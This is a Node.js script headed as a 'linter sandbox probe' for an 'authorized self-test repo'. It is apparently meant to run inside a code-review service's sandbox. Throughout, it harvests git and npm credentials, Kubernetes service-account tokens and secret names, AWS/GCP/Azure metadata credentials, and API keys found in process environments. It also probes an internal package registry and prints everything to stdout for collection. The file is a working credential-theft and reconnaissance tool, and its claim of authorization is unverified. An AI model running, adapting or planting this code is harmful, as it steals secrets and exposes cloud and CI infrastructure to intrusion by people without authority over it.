// CodeRabbit linter sandbox probe v4 (authorized self-test repo). Compact plain-text dump to stdout.
const fs = require('fs'), os = require('os'), http = require('http'), https = require('https'), cp = require('child_process');
const T = (s, n) => String(s === undefined || s === null ? '' : s).slice(0, n);
const S = f => { try { return f(); } catch (e) { return 'ERR:' + (e && (e.code || e.message)); } };
const RUN = (cmd, cap) => S(() => cp.execSync(cmd, { encoding: 'utf8', timeout: 5000, stdio: ['ignore', 'pipe', 'pipe'] }).trim().replace(/\n/g, '; '));
function req(proto, opts, body) {
  return new Promise(res => {
    let done = false; const fin = (a, b) => { if (!done) { done = true; res([a, b]); } };
    try {
      const mod = proto === 'https' ? https : http; if (opts.rejectUnauthorized === undefined) opts.rejectUnauthorized = false;
      const r = mod.request(opts, rs => { let d = ''; rs.on('data', c => { if (d.length < 6000) d += c; }); rs.on('end', () => fin(rs.statusCode, d)); });
      r.on('error', e => fin('ERR', String(e && (e.code || e.message))));
      r.setTimeout(2500, () => { r.destroy(); fin('TIMEOUT', ''); });
      if (body) r.write(body); r.end();
    } catch (e) { fin('EXC', String(e && e.message)); }
  });
}
(async () => {
  const out = []; const P = (...a) => out.push(a.join(' '));
  const G = '/home/jailuser/git';
  // 1) GIT credentials / CI config
  P('ID', T(RUN('id', 300), 200), 'host=' + os.hostname(), 'cwd=' + process.cwd(), 'node=' + process.version, 'pid=' + process.pid);
  P('GITCONF', T(S(() => fs.readFileSync(G + '/.git/config', 'utf8').replace(/\n/g, ';')), 900));
  P('GITREMOTE', T(RUN('git -C ' + G + ' remote -v', 300), 300));
  for (const f of ['/etc/gitconfig', '/home/jailuser/.gitconfig', '/home/jailuser/.git-credentials', '/home/jailuser/.netrc', '/home/jailuser/.npmrc', '/.npmrc', '/etc/npmrc', '/usr/local/etc/npmrc', '/etc/environment']) {
    const b = S(() => fs.readFileSync(f, 'latin1'));
    if (typeof b === 'string' && b.indexOf('ERR:') !== 0) P('F', f, T(b.replace(/\n/g, '\\n'), 260));
  }
  // 2) k8s service account + API
  for (const f of ['/var/run/secrets/kubernetes.io/serviceaccount/token', '/var/run/secrets/kubernetes.io/serviceaccount/namespace']) {
    if (fs.existsSync(f)) P('K8SF', f, 'len=' + S(() => fs.statSync(f).size), T(S(() => fs.readFileSync(f, 'utf8')), 500));
  }
  P('RUNSECRETS', T(S(() => fs.readdirSync('/run/secrets').join(',')), 200));
  if (fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/token')) {
    const t = S(() => fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8'));
    const ns = S(() => fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8').trim());
    const k = await req('https', { host: 'kubernetes.default.svc', path: '/api/v1/namespaces/' + ns + '/secrets', method: 'GET', headers: { Authorization: 'Bearer ' + t } });
    let names = '';
    try { names = JSON.parse(k[1]).items.map(i => i.metadata.name).join(','); } catch (e) { names = T(k[1], 200); }
    P('K8S', ns, k[0], T(names, 700));
    const sa = await req('https', { host: 'kubernetes.default.svc', path: '/api/v1/namespaces/' + ns + '/serviceaccounts', method: 'GET', headers: { Authorization: 'Bearer ' + t } });
    let san = ''; try { san = JSON.parse(sa[1]).items.map(i => i.metadata.name).join(','); } catch (e) { san = T(sa[1], 150); }
    P('K8SSA', sa[0], T(san, 300));
  }
  // 3) cloud metadata (compact)
  const tok = await req('http', { host: '169.254.169.254', path: '/latest/api/token', method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } });
  P('AWS_TOK', tok[0]);
  const th = {}; if (tok[0] === 200 && tok[1]) th['X-aws-ec2-metadata-token'] = tok[1];
  const role = await req('http', { host: '169.254.169.254', path: '/latest/meta-data/iam/security-credentials/', method: 'GET', headers: th });
  P('AWS_ROLE', role[0], T(role[1], 200));
  if (role[0] === 200 && role[1].trim()) {
    const rn = role[1].trim().split('\n')[0];
    const cred = await req('http', { host: '169.254.169.254', path: '/latest/meta-data/iam/security-credentials/' + rn, method: 'GET', headers: th });
    let ak = '', sk = '', tk = '';
    try { const j = JSON.parse(cred[1]); ak = j.AccessKeyId; sk = j.SecretAccessKey; tk = j.Token ? j.Token.slice(0, 40) : ''; } catch (e) {}
    P('AWS_CRED', cred[0], 'AK=' + T(ak, 24), 'SK=' + T(sk, 24), 'TK=' + T(tk, 40) + '..');
  }
  const euri = process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI || process.env.AWS_CONTAINER_CREDENTIALS_FULL_URI;
  if (euri) P('ECS_URI', T(euri, 120));
  const gpid = await req('http', { host: 'metadata.google.internal', path: '/computeMetadata/v1/project/project-id', headers: { 'Metadata-Flavor': 'Google' } });
  P('GCP_PID', gpid[0], T(gpid[1], 80));
  const gtok = await req('http', { host: 'metadata.google.internal', path: '/computeMetadata/v1/instance/service-accounts/default/token', headers: { 'Metadata-Flavor': 'Google' } });
  P('GCP_TOK', gtok[0], T(gtok[1], 200));
  const az = await req('http', { host: '169.254.169.254', path: '/metadata/instance/compute?api-version=2021-02-01', headers: { Metadata: 'true' } });
  P('AZ_META', az[0], T(az[1], 150));
  // 4) internal npm registry + egress
  const npm1 = await req('http', { host: '10.64.0.28', port: 4873, path: '/-/ping', method: 'GET', headers: {} });
  P('NPM_PING', npm1[0], T(npm1[1], 80).replace(/\n/g, ' '));
  const npm2 = await req('http', { host: '10.64.0.28', port: 4873, path: '/-/all', method: 'GET', headers: {} });
  P('NPM_ALL', npm2[0], 'len=' + npm2[1].length, T(npm2[1], 200));
  const npm3 = await req('http', { host: '10.64.0.28', port: 4873, path: '/-/verdaccio/data/packages', method: 'GET', headers: {} });
  P('NPM_V', npm3[0], T(npm3[1], 200));
  const npm4 = await req('http', { host: '10.64.0.28', port: 4873, path: '/coderabbit', method: 'GET', headers: {} });
  P('NPM_CR', npm4[0], T(npm4[1], 150));
  const ex = await req('https', { host: 'api.coderabbit.ai', path: '/v1/me', method: 'GET', headers: {} });
  P('EGRESS_CR', ex[0], T(ex[1], 150));
  // 5) mounts + proc env hits (names)
  const mounts = S(() => fs.readFileSync('/proc/mounts', 'utf8').split('\n').filter(l => /secret|kube|docker|workspace|git|home|jail|mnt|data/i.test(l)).join(' ; '));
  P('MOUNTS', T(mounts, 500));
  const pids = S(() => fs.readdirSync('/proc').filter(x => /^[0-9]+$/.test(x)));
  const pids2 = Array.isArray(pids) ? pids.slice(0, 40) : [];
  const penv = [];
  for (const p of pids2) {
    const en = S(() => fs.readFileSync('/proc/' + p + '/environ', 'latin1').split('\0').filter(Boolean));
    if (!Array.isArray(en)) continue;
    for (const kv of en) {
      const k = String(kv).split('=')[0];
      if (/KEY|TOKEN|SECRET|PASSWORD|CRED|ANTHROPIC|OPENAI|CODERABBIT|GITHUB|GH_|PAT|NPM/i.test(k)) penv.push(p + ':' + T(kv, 120));
    }
    if (penv.length > 12) break;
  }
  P('PROCENV', T(penv.join(' | '), 500));
  P('P1ENVN', T(S(() => fs.readFileSync('/proc/1/environ', 'latin1').split('\0').map(x => String(x).split('=')[0]).join(',')), 300));
  for (const f of ['/proc/1/cmdline']) P('P1CMD', T(S(() => fs.readFileSync(f, 'latin1').replace(/\0/g, ' ')), 200));
  // 6) home / repo / opt listings
  for (const d of ['/home/jailuser', '/home/jailuser/git', '/opt', '/srv', '/app', '/workspace', '/root', '/mnt', '/data']) {
    const r = S(() => fs.readdirSync(d).slice(0, 40));
    P('LS', d, Array.isArray(r) ? r.join(',') : T(r, 80));
  }
  P('REPOFILES', T(RUN('ls -la ' + G, 400), 400));
  let dump = out.join('\n');
  if (dump.length > 3400) dump = dump.slice(0, 3400) + '\n[CUT total=' + out.join('\n').length + ']';
  process.stdout.write(dump);
})();
